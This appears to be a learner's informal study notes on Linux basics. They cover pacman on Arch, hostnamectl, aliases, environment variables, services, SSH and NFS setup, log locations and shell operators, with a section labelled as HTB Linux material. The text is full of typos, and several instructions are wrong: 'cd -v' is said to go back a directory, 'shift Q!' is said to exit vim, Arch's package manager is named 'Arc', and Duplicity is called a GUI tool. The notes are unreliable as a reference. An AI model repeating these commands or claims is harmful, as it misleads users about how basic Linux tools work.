-`Watch ls `
-`Watch df -h `
-`weatch  -m`
- `watch -d -n 0.4 free -m ` This will set the our desired time .
- `rmdir` This is use to remov the directory .
# htop
- A system utility to monitor the system resource .
- IT not install in my system .
# data stream 
- It is how linux handle the input and output 
- There are three data stream
  - stdout Output
  - stdrin Input
  - stderr Error -> When the error is return on the screen .
- After running the command if run `echo$?` and the returnig is non zero then it means ur command didn't executed .
# Pacman 
- `pacman -Syy` This will referesh ur repo index . 
- `cat /etc/pacman.d/mirrorlist` This is where the pacman is grabbing data from .
- `pacman -S package_name` This will install the package from the repositry .
- `pacman -R package_name` This will uninstall the pacakage from the system .
-`pacman -Ss package_name` This will search the package from the repo .
- `cd /etc/pacman.d` This will open the pacmen in the root .
# Setting the HostName 
- `hostnamectl` This will list the details of the system hostname .
- `hostnamectl set-hostname requiredname ` This will set the hostname of the system .

# Sudo 
- It helps to give you the power to make changes .

# Alias 
- `alias new_commandname = "PUT ur command here "` This will create the new command for ur usecase .
- `alias` This will list the  all the alias in the system .
-`unalias alias name` This will delete the alias from the system .


# Using Linux Environment 
- An environement variable is a dynamic named valued  stored within the os system,accessible to all running process .These variable are used to provides information and configuration to application and command-line interface . They serve various purpose ,such as defining the behaviour of software applications,passing information between different process .
- The bash shell uses a fetures called environement variable to store information about the shell session and the working env. It allow you to store the data in memory .

- Global Variable This is visible from the shell session and from any spawned child subshells .
- Local Variable  Are available only in the shell that creates them .
- `SET` This command displays all variable defined for a specific process .
- `echo $PATH` This command will lists directories that the shell searches for executable file .
- `cat /etc/profile ` This is the main startup file .
# HTB LINUX 

- `uname -r , -a , -s , -n , -r ,-v ,-m ,-p , -i , -o ` => This will print the system information along the  .

- `man tool_name` This will list the manual of the tool .
- `tool_name help` This will provide the brief overview of the command .
- `apropos tool_name` This will provide the short version of the file info .
- `lsblk` This will show the list of the block device .
-  `lspci` This will show the list of the pci device .
- `ls -l /var/` This will show the list of the specific path . 
- `cd -v` This will take you back the pevious directory .
- `cd .. ` This will directory take you the parents of the child directory .
- `cd dsr && clear ` This switch to the dsr dir and will clear the terminal too .
- `





# Linux Cheat code only  . (HTB only) 
- uname =>It provides details about the operating system, kernel version, hardware, and more.
- `uname help` This will list the entire information about the file .
-  PAckage are the archives binaries that contain the binaries of the software,configuration file ,information file about the dependicies and keep track of the updates and upgrades . In arch we have the `Arc` as the package manager .
- Service : There are the two types of the service that are available 
   - Internal which is required to startup the system. They work internally and is known as the daemon it ends with the `d` .
     - `systemd` It is the init system and system manager used for controlling what programs run when a linux boots up . It responsible for the bootstrapping the user space and the managing the system process after the linux kernal booted . It parallism is the one of the most important  thing to do .
     - `jornalctl` This will provide the 
   - External which is required to log entires from the systemd journey .
   -  A process can be in the following status 
      - Running
      - Waiting for the new event or sytem resource 
      - Zombie stopped but still has an entry in the process table .
      - `kill ,pkill,killall` These all are the commands for the process .

 - curl -I www.lpu.in 
 -  `-I` This is I flag which is responsible for the seeing the response headers .
 -  ` -v` This will shows the full details .
 -  `Cron` It is the tool that can be used in linux system to schedule and automate the process .It allow the user and administator to run the specific task for the specific time period .
 - Here is the way to install the ssh in the linux system .
    - sudo pacman -S openssh
    - systemctl start sshd 
    - systemctl enable sshd
    - Till here ssh will be in our system .
- NFS is a network file system that is a network protocol that allow us to store and manage files on remote systems as if they were stored on the local system . It enables easy and efficient mangement of files accross networks .
- `pacman -Sy` This will update the package database .
- Process for the installation of the NFS server .
  - `pacman -S nfs-utils` This will install the file in the server .
  - `systemctl status nfs-server`
  - `systemctl start rpcbind`
  - `systemctl enable nfs-server`
  - `systemctl status nfs-server`
 - Curl use to transfer the files over the protocol from the shell .
 - wget is the alternative for the curl it can download the data from the network . 

 - Backup and restore are the key essential things in the linux system and in linux we have multpile things to easily and securily backup and restore the file . 
    - `RSYNC`It is particullary used for transferring the large amount of the data over the network.
    - `Duplicity` It is gui tool for the that allows us to comprehensive data proctection and secure backups. It uses rsync as a backend and store the data into the remote storage media sucer as ftp server .
- File system Management 
  - It is the complex process that involves organising and maintaing the data stored on a disk or other device .
  - Directories are use to store the collection of the file . And when the file is stored into the directory it is known as the parents directory for the files .
    - ls -in means that it will list the file with the inode in the long formate .
-  `fdisk -l` This will list the disk storage . And it is the common partioning tool on the linux .
-  Mounting is the process of the attaching a drive to a specific directory,making it accessible to the file system .   
-  `mount` This will list the all currently mounted file .
- `net-tools` was install here as netstat is depricetd here  .
- Hardening  it is the effective tooling for the securing the linux system in keeeping our and the data safe .
- One of the major security practice is to keep the os and the package upto date .
- TCp Wrapper is a security mechanism used in the kinux which allow the system admin to control which services are allowed to acces the system . It restrict the services based on the hostname and IP address of the user requesting access .
- The main goal of the firewall is to monitor the traffic and to control the network traffic between network segments . 
- System logs are the set of the files that contains information about the system an the activities taking place on it .
- kernal log are stored into the `/var/log/kern.log`
- system log are stored into the `/var/log/syslog`
- authentication logs are stored into the `/var/log/auth.log`
- `pacman -Fy` was done which was the large file . It is use to update the local database with the updated file .
-`sudo dpkg --configure -a` This is used for the debian package manager which handles the .deb package installation configuration and removal and the flag -a here means that it tells the dpkg to attempt  to congfigure all packages that are in the unconfigured state .
- access log keep a record of users and process activity on the system,including login attempts,file access and the network connection .
- `Audit logs` Keeps records information about security-relevant events on the system .
-  `lsblk`
-`ifconfig -a`
- `ls -lrt` This will list the last modified file at the end .
-  If we want to get all the entries starting with the letter "s" in the directory of /dev/ then we need to press the [tab] twice and we will get all the entires of that directory .

- To exit vim we need to  shift Q! .
- `pacman -Sup` This will print the location of all the package that are in the current full system update (-u) .
- The command pacman-conf --repo core server is related to Arch Linux and its package management system, pacman. The pacman-conf command is used to query configuration information from the pacman.conf file, which is the main configuration file for pacman. 
- `&` is the operator  that allows you to run the command in the backeground of your terminal .
- `&&` this operator allow you to combine multiple commands together in one line of the terminal .
- `>` This operatoe is a redirector meaning that we can take the output from command and direct it elsewhere .
- `>>` This operator does the same function but nothing is overwritten .
- There one of the important things which we ignore it .
  - root directory this is the top level directory that we already know about it . Owned by the system administrator.
- `Home directory` Its symbol is [~] this is the sub-directory for the personal files and setting under the root directory owned by the individual user .
- `rmdir` is remove the directory 
- Use `&&` to run the second command only if the first command succed . 